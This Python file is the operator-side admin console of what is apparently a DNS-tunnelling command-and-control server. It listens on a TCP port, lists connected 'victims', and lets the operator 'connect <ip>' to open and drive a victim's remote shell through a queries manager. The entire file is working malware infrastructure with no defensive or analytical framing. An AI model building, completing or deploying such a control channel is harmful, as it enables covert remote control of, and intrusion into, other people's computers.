from socket import socket
from socket import AF_INET, SOCK_STREAM
from objects import QueriesManager


class AdminInterface:

    admin_interface_host: str
    admin_interface_port: int
    queries_manager: QueriesManager
    s: socket
    shell_opened: bool = False
    max_paquet_size: int = 65527

    def __init__(
        self,
        admin_interface_host: str,
        admin_interface_port: int,
        queries_manager: QueriesManager,
    ) -> None:
        self.admin_interface_host = admin_interface_host
        self.admin_interface_port = admin_interface_port
        self.queries_manager = queries_manager

    def start(self, host: str, port: int) -> None:
        while True:
            try:
                self.s = socket(AF_INET, SOCK_STREAM)
                self.s.bind((self.admin_interface_host, self.admin_interface_port))
                self.s.listen(1)
                self.s, _ = self.s.accept()
                self.s.send(
                    f"Welcome to the admin interface. The server is listening to DNS queries on {host} port {port} (UDP protocol).\n".encode()
                )
                self.s.send(
                    f"Commands:\n    list\n    connect <ip>\n    exit\n".encode()
                )
                while True:
                    if self.shell_opened:
                        data = self.s.recv(self.max_paquet_size)
                        if len(data) == 1:
                            self.queries_manager.printShell()
                            continue
                        elif data[:11] == b"closeshell\n" and len(data) == 11:
                            self.queries_manager.closeAdminInterfaceConnection()
                            self.s.send(f"You are now disconnected.\n".encode())
                            self.shell_opened = False
                        else:
                            self.queries_manager.respond(data)
                    else:
                        self.s.send("admininterface> ".encode())
                        data = self.s.recv(4096)
                        try:
                            data = data.decode().strip()
                            if len(data) == 0:
                                continue
                            elif data == "list":
                                self.s.send(self.queries_manager.listVictims().encode())
                            elif data == "exit":
                                self.close()
                                break
                            elif (
                                len(data.split()) == 2 and data.split()[0] == "connect"
                            ):
                                ip = data.split()[1]
                                try:
                                    self.queries_manager.adminInterfaceConnection(
                                        ip, self.s
                                    )
                                    self.shell_opened = True
                                except AssertionError:
                                    self.s.send(
                                        "IP not recognized, maybe the victim is not connected.\n".encode()
                                    )
                            else:
                                self.s.send("unknown command\n".encode())
                        except UnicodeDecodeError:
                            self.s.send("unknown command\n".encode())
            except BrokenPipeError:
                self.s.close()
                self.s = None
                self.queries_manager.closeAdminInterfaceConnection()
            except OSError:
                pass

    def close(self) -> None:
        self.s.close()
